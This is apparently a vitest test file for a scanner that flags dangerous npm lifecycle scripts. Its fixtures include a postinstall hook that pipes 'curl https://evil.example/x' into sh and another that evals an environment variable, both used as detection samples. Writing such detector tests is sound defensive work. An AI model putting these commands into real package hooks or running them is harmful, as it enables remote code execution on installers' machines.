import { describe, expect, it } from "vitest";
import { analyzeLifecycleScripts, hasLifecycleScripts } from "../src/dangerous-scripts.js";

describe("analyzeLifecycleScripts", () => {
  it("detects shell pipe pattern", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "curl https://evil.example/x | sh",
    });
    expect(f.some((x) => x.id === "script-pipe-shell")).toBe(true);
  });

  it("detects eval", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "node -e \"eval(process.env.X)\"",
    });
    expect(f.some((x) => x.id === "script-eval")).toBe(true);
  });

  it("skips benign node-gyp without curl", () => {
    const f = analyzeLifecycleScripts({
      postinstall: "node-gyp rebuild",
    });
    expect(f.length).toBe(0);
  });

  it("hasLifecycleScripts", () => {
    expect(hasLifecycleScripts({ postinstall: "echo hi" })).toBe(true);
    expect(hasLifecycleScripts({ build: "tsc" })).toBe(false);
  });
});
